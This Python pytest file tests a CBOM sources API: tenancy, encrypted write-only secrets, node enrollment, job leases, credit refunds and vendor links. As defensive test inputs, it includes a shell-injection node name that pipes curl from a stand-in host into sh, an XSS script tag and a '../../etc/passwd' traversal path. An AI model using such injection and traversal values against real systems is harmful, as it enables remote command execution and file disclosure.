"""CBOM Sources API end to end on SQLite (real JWTs, real routers, foreign keys enforced).

Covers tenancy, write-only secrets, node enrollment and job leasing, credits and refunds, settings
permissions, evidence and single-use vendor links.  Run:

    cd backend && PYTHONPATH=.. JWT_SECRET_KEY=t JWT_REFRESH_SECRET_KEY=r AWS_ACCESS_KEY_ID=x \
      AWS_SECRET_ACCESS_KEY=y AWS_DEFAULT_REGION=us-east-1 uv run --with pytest python -m pytest \
      tests/test_cbom_sources_api.py -q -p no:cacheprovider
"""
from __future__ import annotations

import datetime as dt
import json
import os
import sys
from pathlib import Path

import pytest
from cryptography.fernet import Fernet

_REPO_ROOT = Path(__file__).resolve().parents[2]
if str(_REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(_REPO_ROOT))
os.environ.setdefault("JWT_SECRET_KEY", "cbom-sources-test-secret")
os.environ.setdefault("JWT_REFRESH_SECRET_KEY", "cbom-sources-test-refresh")
os.environ["ENCRYPTION_KEY"] = Fernet.generate_key().decode()

from fastapi.testclient import TestClient  # noqa: E402
from sqlalchemy import event  # noqa: E402
from sqlmodel import Session, SQLModel, create_engine, select  # noqa: E402

from backend.main import app  # noqa: E402
from backend.new_models import (  # noqa: E402
    CbomCollectionJob,
    CbomCollectionRun,
    CbomCollectionSource,
    CbomScanNode,
    Scan,
    Team,
    TeamMembership,
    User,
)
from backend.routers import cbom_node, cbom_sources, cbom_vendor_public  # noqa: E402
from backend.utilities.auth import auth_utils  # noqa: E402
from backend.utilities.cbom_sources import http as cbom_http  # noqa: E402
from backend.utilities.cbom_sources import targets as T  # noqa: E402
from backend.utilities.cbom_sources.cleanup import delete_cbom_sources_for_team  # noqa: E402
from backend.utilities.cbom_sources.settings import default_window, next_window_start  # noqa: E402
from backend.utilities.db.encryption import _get_fernet  # noqa: E402

PASSWORD = "Canary-Pa55word-7f3a91"
PEM_KEY = "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQ\n-----END PRIVATE KEY-----"
USERS = {"alice": ("alice@t1.test", 1, "admin"), "bob": ("bob@t1.test", 1, "member"), "carol": ("carol@t2.test", 2, "admin")}


@pytest.fixture()
def world(tmp_path, monkeypatch):
    _get_fernet.cache_clear()
    engine = create_engine(f"sqlite:///{tmp_path / 'w.db'}", connect_args={"check_same_thread": False})

    @event.listens_for(engine, "connect")
    def _fk(dbapi_conn, _record):  # enforce foreign keys like Postgres does
        dbapi_conn.execute("PRAGMA foreign_keys=ON")

    SQLModel.metadata.create_all(engine)
    ids = {}
    with Session(engine) as s:
        s.add(Team(id=1, name="Bank One", credit_balance=100.0))
        s.add(Team(id=2, name="Bank Two", credit_balance=0.5))
        s.commit()
        for who, (email, team, role) in USERS.items():
            user = User(email=email, password="x", first_name=who, last_name="t", profile_photo=None,
                        session_active=True, default_team_id=team)
            s.add(user)
            s.commit()
            s.refresh(user)
            ids[who] = user.id
            s.add(TeamMembership(team_id=team, user_id=user.id, role=role))
        s.add(Scan(id=77, team_id=1, owner_user_id=ids["alice"], scan_type="cbom", title="code", scan_status="NOT_STARTED"))
        s.add(Scan(id=78, team_id=1, owner_user_id=ids["alice"], scan_type="sast", title="sast", scan_status="NOT_STARTED"))
        s.commit()
    for module in (cbom_http, cbom_node, cbom_vendor_public):
        monkeypatch.setattr(module, "get_db", lambda: engine)
    for limiter in (cbom_http.read_limiter, cbom_http.write_limiter, cbom_http.node_limiter,
                    cbom_http.enroll_limiter, cbom_http.vendor_limiter):
        limiter.requests.clear()
    return engine, ids


@pytest.fixture()
def api(world):
    client = TestClient(app)
    tokens = {who: auth_utils.create_access_token(email) for who, (email, _t, _r) in USERS.items()}
    seen: list[str] = []

    def call(method: str, url: str, who: str | None = "alice", **kwargs):
        headers = dict(kwargs.pop("headers", {}) or {})
        if who:
            headers["Authorization"] = f"Bearer {tokens[who]}"
        response = client.request(method, url, headers=headers, **kwargs)
        seen.append(response.text)
        return response

    call.seen = seen  # type: ignore[attr-defined]
    call.client = client  # type: ignore[attr-defined]
    return call


def linux_body(name="linux-dc", node_id=None, targets=None, **cfg):
    return {"kind": "linux_servers", "name": name, "node_id": node_id,
            "config": {"targets": targets or ["10.20.0.0/29", "app-01.bank.local"], "credential_type": "password",
                       "login_user": "zs-cbom", **cfg},
            "secrets": {"password": PASSWORD}}


def enroll_node(api, team=1, who="alice", name="dc-mumbai-01"):
    r = api("POST", f"/{team}/cbom/sources/nodes", who, json={"name": name, "segment": "Data centre"})
    assert r.status_code == 201, r.text
    node, reg = r.json()["node"], r.json()["registration_token"]
    e = api("POST", "/cbom/node/enroll", None, json={"registration_token": reg, "hostname": "n1", "version": "1.0",
                                                     "source_ips": ["10.20.1.15"], "clock": dt.datetime.utcnow().isoformat() + "Z"})
    assert e.status_code == 200, e.text
    return node["id"], e.json()["node_token"], reg


# ----------------------------------------------------------------------------- targets (pure)
def test_target_counting_rules():
    p = T.parse_targets(["ip", "10.0.0.0/24", "10.0.0.128/25", "10.0.1.1-10.0.1.10", "Host.Example.COM.", "host.example.com",
                         "::ffff:10.0.2.1", "# comment", ""])
    assert T.size(p.intervals) == 256 + 10 + 1
    assert p.hostnames == ["host.example.com"]
    excl = T.parse_exclusions(["10.0.0.0/26", "host.example.com"])
    assert T.count_in_scope(p, excl) == 256 + 10 + 1 - 64
    assert T.count_blocks([(4, 0x0A000080, 0x0A0000FF), (4, 0x0A000100, 0x0A00017F)]) == 2
    assert T.parse_targets(["10.0.0.0/31"]).intervals[0][2] - T.parse_targets(["10.0.0.0/31"]).intervals[0][1] == 1
    with pytest.raises(T.TargetError, match="did you mean 10.0.0.0/24"):
        T.parse_targets(["10.0.0.5/24"])
    with pytest.raises(T.TargetError, match="larger than /16"):
        T.parse_targets(["10.0.0.0/12"])
    with pytest.raises(T.TargetError, match="limit is 1,000"):
        T.parse_targets([f"10.1.{i // 250}.{i % 250}" for i in range(1001)])
    with pytest.raises(T.TargetError, match="at least one"):
        T.parse_targets(["", "# nothing"])


def test_window_and_next_start():
    grid = default_window()
    assert sum(sum(r) for r in grid) == 35  # 5 evenings x 2 h + 5 early mornings x 5 h
    monday_noon_ist = dt.datetime(2026, 11, 2, 6, 30)  # 12:00 IST
    nxt = next_window_start(grid, "Asia/Kolkata", monday_noon_ist)
    assert nxt == dt.datetime(2026, 11, 2, 16, 30)  # 22:00 IST


# ----------------------------------------------------------------------------- nodes
def test_node_enrollment_is_single_use_and_tokens_never_come_back(api, world):
    node_id, node_token, reg = enroll_node(api)
    again = api("POST", "/cbom/node/enroll", None, json={"registration_token": reg})
    assert again.status_code == 401
    got = api("GET", f"/1/cbom/sources/nodes/{node_id}").json()["node"]
    assert got["status"] == "online" and got["source_ips"] == ["10.20.1.15"]
    blob = json.dumps(got)
    assert reg not in blob and node_token not in blob and "hash" not in blob
    hb = api("POST", "/cbom/node/heartbeat", None, headers={"X-ZS-Node-Token": node_token}, json={"version": "1.1"})
    assert hb.status_code == 200 and hb.json()["stop_all_network"] is False
    assert api("POST", "/cbom/node/heartbeat", None, json={}).status_code == 401
    assert api("POST", "/cbom/node/heartbeat", None, headers={"X-ZS-Node-Token": "zsn_wrong"}, json={}).status_code == 401
    assert api("POST", f"/1/cbom/sources/nodes/{node_id}/registration-token").status_code == 409
    reset = api("POST", f"/1/cbom/sources/nodes/{node_id}/reset")
    assert reset.status_code == 200 and reset.json()["node"]["status"] == "pending_registration"
    assert api("POST", "/cbom/node/heartbeat", None, headers={"X-ZS-Node-Token": node_token}, json={}).status_code == 401


def test_expired_registration_token(api, world):
    engine, _ = world
    r = api("POST", "/1/cbom/sources/nodes", json={"name": "late-node"})
    node_id, reg = r.json()["node"]["id"], r.json()["registration_token"]
    with Session(engine) as s:
        node = s.get(CbomScanNode, node_id)
        node.registration_expires_at = dt.datetime.utcnow() - dt.timedelta(minutes=1)
        s.add(node)
        s.commit()
    assert api("POST", "/cbom/node/enroll", None, json={"registration_token": reg}).status_code == 401
    assert api("GET", f"/1/cbom/sources/nodes/{node_id}").json()["node"]["status"] == "registration_expired"
    fresh = api("POST", f"/1/cbom/sources/nodes/{node_id}/registration-token")
    assert fresh.status_code == 200 and fresh.json()["registration_token"] != reg


def test_install_command_inputs_are_validated(api):
    assert api("POST", "/1/cbom/sources/nodes", json={"name": "x';curl evil|sh;'"}).status_code == 400
    assert api("POST", "/1/cbom/sources/nodes", json={"name": "ok", "proxy_url": "http://u:p@proxy:8080"}).status_code == 400
    assert api("POST", "/1/cbom/sources/nodes", json={"name": "ok", "proxy_url": "http://proxy.bank.local:8080"}).status_code == 201


# ----------------------------------------------------------------------------- sources and secrets
def test_secrets_are_write_only_and_encrypted(api, world):
    engine, _ = world
    node_id, _tok, _ = enroll_node(api)
    r = api("POST", "/1/cbom/sources/items", json=linux_body(node_id=node_id))
    assert r.status_code == 201, r.text
    src = r.json()["source"]
    assert src["secrets_set"] == ["password"] and src["target_count"] == 9
    api("GET", "/1/cbom/sources/items")
    api("GET", f"/1/cbom/sources/items/{src['id']}")
    api("GET", "/1/cbom/sources/overview")
    assert not any(PASSWORD in body for body in api.seen)
    with Session(engine) as s:
        row = s.get(CbomCollectionSource, src["id"])
        assert PASSWORD not in (row.secret_encrypted or "") and PASSWORD not in json.dumps(row.config)


def test_validation_errors_are_400_and_never_echo_input(api, world):
    node_id, _t, _ = enroll_node(api)
    body = linux_body(node_id=node_id, port=70000)
    r = api("POST", "/1/cbom/sources/items", json=body)
    assert r.status_code == 400 and "port" in r.json()["detail"] and PASSWORD not in r.text
    bad = linux_body(node_id=node_id, targets=["10.0.0.5/24"])
    r = api("POST", "/1/cbom/sources/items", json=bad)
    assert r.status_code == 400 and "did you mean 10.0.0.0/24" in r.json()["detail"]


def test_tenancy(api, world):
    node_id, _t, _ = enroll_node(api)
    src = api("POST", "/1/cbom/sources/items", json=linux_body(node_id=node_id)).json()["source"]
    assert api("GET", f"/1/cbom/sources/items/{src['id']}", "carol").status_code == 403  # not a member (existing rule)
    assert api("GET", f"/2/cbom/sources/items/{src['id']}", "carol").status_code == 404
    assert api("POST", "/2/cbom/sources/items", "carol", json=linux_body(node_id=node_id)).status_code == 400
    assert api("POST", "/2/cbom/sources/runs", "carol", json={"include": {"servers": True}, "scan_id": 77,
                                                              "client_request_id": "carol-run-0001"}).status_code == 404


def test_owner_or_admin_rule_returns_400_not_403(api, world):
    node_id, _t, _ = enroll_node(api)
    src = api("POST", "/1/cbom/sources/items", json=linux_body(node_id=node_id)).json()["source"]
    r = api("PATCH", f"/1/cbom/sources/items/{src['id']}", "bob", json={"name": "renamed"})
    assert r.status_code == 400 and "team admin" in r.json()["detail"]
    mine = api("POST", "/1/cbom/sources/items", "bob", json=linux_body(name="bob-src", node_id=node_id)).json()["source"]
    assert api("PATCH", f"/1/cbom/sources/items/{mine['id']}", "bob", json={"name": "bob-renamed"}).status_code == 200
    assert api("PATCH", f"/1/cbom/sources/items/{mine['id']}", "alice", json={"enabled": False}).status_code == 200


def test_secret_is_cleared_when_where_it_is_used_changes(api, world):
    node_id, _t, _ = enroll_node(api)
    src = api("POST", "/1/cbom/sources/items", json=linux_body(node_id=node_id)).json()["source"]
    cfg = {**src["config"], "targets": ["10.99.0.1"]}
    r = api("PATCH", f"/1/cbom/sources/items/{src['id']}", json={"config": cfg, "expected_version": src["row_version"]})
    assert r.status_code == 400 and "re-enter" in r.json()["detail"]
    r = api("PATCH", f"/1/cbom/sources/items/{src['id']}",
            json={"config": cfg, "secrets": {"password": "NewPass-123"}, "expected_version": src["row_version"]})
    assert r.status_code == 200 and r.json()["source"]["target_count"] == 1
    stale = api("PATCH", f"/1/cbom/sources/items/{src['id']}", json={"name": "x2", "expected_version": src["row_version"]})
    assert stale.status_code == 409
    node_key = {**r.json()["source"]["config"], "credential_type": "node_key"}
    r2 = api("PATCH", f"/1/cbom/sources/items/{src['id']}", json={"config": node_key})
    assert r2.status_code == 200 and r2.json()["source"]["secrets_set"] == []
    assert api("PATCH", f"/1/cbom/sources/items/{src['id']}", json={"kind": "database"}).status_code == 400


def test_duplicate_names_and_node_delete_guard(api, world):
    node_id, _t, _ = enroll_node(api)
    assert api("POST", "/1/cbom/sources/items", json=linux_body(node_id=node_id)).status_code == 201
    dup = api("POST", "/1/cbom/sources/items", json=linux_body(name="LINUX-DC", node_id=node_id))
    assert dup.status_code == 409
    blocked = api("DELETE", f"/1/cbom/sources/nodes/{node_id}")
    assert blocked.status_code == 400 and "linux-dc" in blocked.json()["detail"]


# ----------------------------------------------------------------------------- jobs
def test_connection_test_round_trip_with_lease_and_scrub(api, world):
    node_id, token, _ = enroll_node(api)
    src = api("POST", "/1/cbom/sources/items", json=linux_body(node_id=node_id)).json()["source"]
    t = api("POST", f"/1/cbom/sources/items/{src['id']}/test").json()
    assert t["status"] == "queued"
    job_id = t["job"]["id"]
    hdr = {"X-ZS-Node-Token": token}
    claim = api("POST", "/cbom/node/jobs/claim", None, headers=hdr)
    assert claim.status_code == 200
    payload = claim.json()
    assert payload["source"]["secrets"]["password"] == PASSWORD  # only the owning node ever sees it
    assert payload["scope"]["targets"] == ["10.20.0.1", "10.20.0.2", "10.20.0.3", "10.20.0.4", "10.20.0.5"]
    assert api("POST", "/cbom/node/jobs/claim", None, headers=hdr).status_code == 204
    wrong = api("POST", f"/cbom/node/jobs/{job_id}/result", None, headers=hdr,
                json={"lease_id": "x" * 24, "status": "success", "result": {}})
    assert wrong.status_code == 409
    samples = [{"target": f"10.20.0.{i}", "status": "ready"} for i in range(1, 4)] + \
              [{"target": "10.20.0.4", "status": "sudoers_missing", "note": f"leak {PASSWORD} {PEM_KEY}"}]
    done = api("POST", f"/cbom/node/jobs/{job_id}/result", None, headers=hdr,
               json={"lease_id": payload["job"]["lease_id"], "status": "success", "result": {"samples": samples}})
    assert done.status_code == 200, done.text
    got = api("GET", f"/1/cbom/sources/items/{src['id']}").json()["source"]
    assert got["last_test_status"] == "partial" and got["last_test_summary"] == "3 of 4 samples ready"
    job = api("GET", f"/1/cbom/sources/jobs/{job_id}").json()["job"]
    assert PASSWORD not in json.dumps(job) and "PRIVATE KEY" not in json.dumps(job)


def test_expired_lease_requeues_then_fails(api, world):
    engine, _ = world
    node_id, token, _ = enroll_node(api)
    src = api("POST", "/1/cbom/sources/items", json=linux_body(node_id=node_id)).json()["source"]
    job_id = api("POST", f"/1/cbom/sources/items/{src['id']}/test").json()["job"]["id"]
    hdr = {"X-ZS-Node-Token": token}
    for attempt in range(1, 4):
        assert api("POST", "/cbom/node/jobs/claim", None, headers=hdr).status_code == 200
        with Session(engine) as s:
            job = s.get(CbomCollectionJob, job_id)
            job.lease_expires_at = dt.datetime.utcnow() - dt.timedelta(seconds=1)
            s.add(job)
            s.commit()
        status = api("GET", f"/1/cbom/sources/jobs/{job_id}").json()["job"]["status"]
        assert status == ("pending" if attempt < 3 else "failure")
    assert api("GET", f"/1/cbom/sources/items/{src['id']}").json()["source"]["last_test_status"] == "failed"


def test_edit_cancels_pending_jobs_and_node_cannot_claim_stale_work(api, world):
    node_id, token, _ = enroll_node(api)
    src = api("POST", "/1/cbom/sources/items", json=linux_body(node_id=node_id)).json()["source"]
    job_id = api("POST", f"/1/cbom/sources/items/{src['id']}/test").json()["job"]["id"]
    api("PATCH", f"/1/cbom/sources/items/{src['id']}", json={"config": {**src["config"], "port": 2222},
                                                             "secrets": {"password": "x-new-1"}})
    assert api("GET", f"/1/cbom/sources/jobs/{job_id}").json()["job"]["status"] == "cancelled"
    assert api("POST", "/cbom/node/jobs/claim", None, headers={"X-ZS-Node-Token": token}).status_code == 204


# ----------------------------------------------------------------------------- credits and runs
def test_run_charges_once_refunds_on_cancel(api, world):
    engine, _ = world
    node_id, _t, _ = enroll_node(api)
    src = api("POST", "/1/cbom/sources/items", json=linux_body(node_id=node_id)).json()["source"]
    est = api("POST", "/1/cbom/sources/estimate", json={"include": {"servers": True}}).json()
    assert est["total_credits"] == 1.8  # 9 targets x 0.2
    body = {"include": {"servers": True}, "client_request_id": "run-req-000001", "expected_credits": 1.0, "scan_id": 77}
    assert api("POST", "/1/cbom/sources/runs", json=body).status_code == 409
    body["expected_credits"] = 1.8
    first = api("POST", "/1/cbom/sources/runs", json=body)
    assert first.status_code == 201, first.text
    replay = api("POST", "/1/cbom/sources/runs", json=body)
    assert replay.status_code == 200 and replay.json()["replayed"] is True
    with Session(engine) as s:
        assert round(s.get(Team, 1).credit_balance, 2) == 98.2
    again = api("POST", "/1/cbom/sources/runs", json={**body, "client_request_id": "run-req-000002"})
    assert again.status_code == 409
    run_id = first.json()["run"]["id"]
    assert api("POST", f"/1/cbom/sources/runs/{run_id}/cancel", "bob").status_code == 400
    c1 = api("POST", f"/1/cbom/sources/runs/{run_id}/cancel").json()
    c2 = api("POST", f"/1/cbom/sources/runs/{run_id}/cancel").json()
    assert c1["refunded"] == 1.8 and c2["refunded"] == 0 and c1["run"]["status"] == "cancelled"
    with Session(engine) as s:
        assert round(s.get(Team, 1).credit_balance, 2) == 100.0
    assert src["id"]
    assert api("POST", "/1/cbom/sources/runs", json={**body, "client_request_id": "run-req-000003", "scan_id": 78}).status_code == 400


def test_insufficient_credits_creates_nothing(api, world):
    engine, _ = world
    node_id, _t, _ = enroll_node(api, team=2, who="carol")
    api("POST", "/2/cbom/sources/items", "carol", json=linux_body(node_id=node_id))
    r = api("POST", "/2/cbom/sources/runs", "carol", json={"include": {"servers": True}, "client_request_id": "poor-team-001"})
    assert r.status_code == 400 and "needs 1.8" in r.json()["detail"]
    with Session(engine) as s:
        assert s.exec(select(CbomCollectionRun)).all() == []
        assert s.get(Team, 2).credit_balance == 0.5


def test_cloud_sources_are_skipped_not_charged(api, world):
    r = api("POST", "/1/cbom/sources/items", json={"kind": "aws_account", "name": "payments-prod", "config": {
        "role_arn": "arn:aws:iam::111122223333:role/ZeroShieldCBOMReader", "regions": ["ap-south-1", "us-east-1"]}})
    assert r.status_code == 201, r.text
    est = api("POST", "/1/cbom/sources/estimate", json={"include": {"cloud": True}}).json()
    assert est["total_credits"] == 0 and est["skipped"][0]["reason"] == "Cloud collection is not available yet"
    run = api("POST", "/1/cbom/sources/runs", json={"include": {"cloud": True}, "client_request_id": "cloud-only-01"})
    assert run.status_code == 400


def test_aws_validation_uses_external_id_and_stores_checks(api, world, monkeypatch):
    calls = {}

    def fake(team_id, role_arn, external_id, regions, scope):
        calls.update(team_id=team_id, external_id=external_id)
        return {"status": "passed", "checks": [{"check": "Role assumed with external ID", "status": "pass", "detail": "ok"}]}

    monkeypatch.setattr(cbom_sources, "validate_aws_role", fake)
    src = api("POST", "/1/cbom/sources/items", json={"kind": "aws_account", "name": "core", "config": {
        "role_arn": "arn:aws:iam::111122223333:role/ZeroShieldCBOMReader"}}).json()["source"]
    r = api("POST", f"/1/cbom/sources/items/{src['id']}/test").json()
    settings = api("GET", "/1/cbom/sources/settings").json()["settings"]
    assert r["status"] == "passed" and calls["external_id"] == settings["aws_external_id"]
    assert api("GET", f"/1/cbom/sources/items/{src['id']}").json()["source"]["last_test_status"] == "passed"
    tpl = api("GET", "/1/cbom/sources/aws/template?scope=organization")
    assert tpl.status_code == 200 and settings["aws_external_id"] in tpl.text and "secretsmanager:GetSecretValue" in tpl.text


def test_aws_validation_reports_platform_errors_without_crashing(monkeypatch):
    from backend.utilities.cbom_sources import aws_validate

    def boom():
        raise RuntimeError("no boto")

    monkeypatch.setattr(aws_validate, "_boto", boom)
    out = aws_validate.validate_aws_role(1, "arn:aws:iam::111122223333:role/R", "zs-ext-AAAA-BBBB-CCCC-DDDD", ["us-east-1"], "account")
    assert out["status"] == "error" and all(c["status"] == "error" for c in out["checks"])


# ----------------------------------------------------------------------------- settings and network
def test_settings_permissions_and_stop_all(api, world):
    assert api("PATCH", "/1/cbom/sources/settings", "bob", json={"soc_email": "soc@bank.test"}).status_code == 400
    ok = api("PATCH", "/1/cbom/sources/settings", json={"soc_email": "soc@bank.test", "network_exclusions": [
        {"cidr": "10.20.99.0/24", "reason": "OT plant"}, {"cidr": "10.20.99.0/24", "reason": "dup"}]})
    assert ok.status_code == 200 and len(ok.json()["settings"]["network_exclusions"]) == 1
    bad = api("PATCH", "/1/cbom/sources/settings", json={"scan_window": [[False] * 24 for _ in range(7)]})
    assert bad.status_code == 400 and "no allowed hours" in bad.json()["detail"]
    assert api("POST", "/1/cbom/sources/settings/stop-all", "bob", json={"on": True}).status_code == 200
    assert api("POST", "/1/cbom/sources/settings/stop-all", "bob", json={"on": False}).status_code == 400
    assert api("POST", "/1/cbom/sources/settings/stop-all", json={"on": False}).json()["settings"]["stop_all_network"] is False


def test_network_run_needs_soc_ack_and_respects_stop(api, world):
    node_id, _t, _ = enroll_node(api)
    r = api("POST", "/1/cbom/sources/items", json={"kind": "network_range", "name": "dc-range", "node_id": node_id,
                                                  "config": {"cidr": "10.20.0.0/22", "mode": "full"}})
    assert r.status_code == 201, r.text
    api("PATCH", "/1/cbom/sources/settings", json={"network_exclusions": [{"cidr": "10.20.3.0/24", "reason": "x"}]})
    est = api("POST", "/1/cbom/sources/estimate", json={"include": {"network": True}}).json()
    assert est["total_credits"] == 3.0  # 3 /24 blocks after the never-scan list
    body = {"include": {"network": True}, "client_request_id": "net-run-0001"}
    assert "soc_ack" in api("POST", "/1/cbom/sources/runs", json=body).json()["detail"]
    api("POST", "/1/cbom/sources/settings/stop-all", json={"on": True})
    est = api("POST", "/1/cbom/sources/estimate", json={"include": {"network": True}}).json()
    assert est["skipped"][0]["reason"] == "Network scanning is stopped"


# ----------------------------------------------------------------------------- evidence and vendors
def test_evidence_confidence_rules(api):
    r = api("PATCH", "/1/cbom/sources/evidence/hsm_firmware", json={"confidence": "Q2"})
    assert r.status_code == 400 and "evidence" in r.json()["detail"]
    today = dt.date.today().isoformat()
    r = api("PATCH", "/1/cbom/sources/evidence/hsm_firmware", json={
        "confidence": "Q3", "evidence_title": "FIPS cert", "evidence_url": "https://csrc.nist.gov/x", "evidence_date": today,
        "answers": {"model": "<script>alert(1)</script>", "process": "yes"}})
    assert r.status_code == 200 and r.json()["area"]["effective_confidence"] == "Q3"
    old = (dt.date.today() - dt.timedelta(days=400)).isoformat()
    r = api("PATCH", "/1/cbom/sources/evidence/hsm_firmware", json={"evidence_date": old})
    assert r.json()["area"]["effective_confidence"] == "Q0"
    assert api("PATCH", "/1/cbom/sources/evidence/hsm_firmware", json={"answers": {"process": "maybe"}}).status_code == 400
    assert api("PATCH", "/1/cbom/sources/evidence/nope", json={}).status_code == 404


def test_vendor_link_is_single_use_and_replaceable(api):
    vendor = api("POST", "/1/cbom/sources/evidence/vendors", json={"name": "Core banking vendor"}).json()["vendor"]
    first = api("POST", f"/1/cbom/sources/evidence/vendors/{vendor['id']}/link").json()
    second = api("POST", f"/1/cbom/sources/evidence/vendors/{vendor['id']}/link").json()
    t1, t2 = first["path"].rsplit("/", 1)[-1], second["path"].rsplit("/", 1)[-1]
    assert api("GET", f"/cbom/vendor-questionnaire/{t1}", None).status_code == 404
    shown = api("GET", f"/cbom/vendor-questionnaire/{t2}", None)
    assert shown.status_code == 200 and shown.json()["team_name"] == "Bank One"
    assert shown.headers["referrer-policy"] == "no-referrer"
    ans = api("POST", f"/cbom/vendor-questionnaire/{t2}", None, json={"answers": {"tls": "TLS 1.2+", "junk": "x"}})
    assert ans.status_code == 200 and ans.json()["confidence"] == "Q1"
    assert api("POST", f"/cbom/vendor-questionnaire/{t2}", None, json={"answers": {"tls": "again"}}).status_code == 404
    assert api("GET", f"/cbom/vendor-questionnaire/{t2}", None).status_code == 404
    ev = api("GET", "/1/cbom/sources/evidence").json()
    assert ev["vendors"][0]["status"] == "answered" and ev["vendors"][0]["answers"] == {"tls": "TLS 1.2+"}
    big = api("POST", f"/cbom/vendor-questionnaire/{t2}", None, content=b"x" * (40 * 1024),
              headers={"content-type": "application/json"})
    assert big.status_code == 413


# ----------------------------------------------------------------------------- misc
def test_templates_and_overview(api):
    sudoers = api("GET", "/1/cbom/sources/templates/sudoers")
    rules = "\n".join(line for line in sudoers.text.splitlines() if not line.startswith("#"))
    assert sudoers.status_code == 200 and "NOPASSWD: ZS_CBOM_TIER2" in rules
    assert not any(ch in rules.split("Cmnd_Alias", 1)[1].replace(".+", "") for ch in "*?[")  # no argument wildcards
    assert api("GET", "/1/cbom/sources/templates/../../etc/passwd").status_code == 404
    ov = api("GET", "/1/cbom/sources/overview").json()
    assert ov["code"]["cbom_scans"] == 1 and ov["evidence"]["areas"] == 6 and ov["rates"]["server"] == 0.2


def test_team_cleanup_removes_every_row(api, world):
    engine, _ = world
    node_id, _t, _ = enroll_node(api)
    src = api("POST", "/1/cbom/sources/items", json=linux_body(node_id=node_id)).json()["source"]
    api("POST", f"/1/cbom/sources/items/{src['id']}/test")
    api("GET", "/1/cbom/sources/evidence")
    counts = delete_cbom_sources_for_team(engine, 1)
    assert counts["cbomcollectionjob"] == 1 and counts["cbomscannode"] == 1 and counts["cbomevidencearea"] == 6
    with Session(engine) as s:
        assert s.exec(select(CbomScanNode)).all() == [] and s.exec(select(CbomCollectionSource)).all() == []
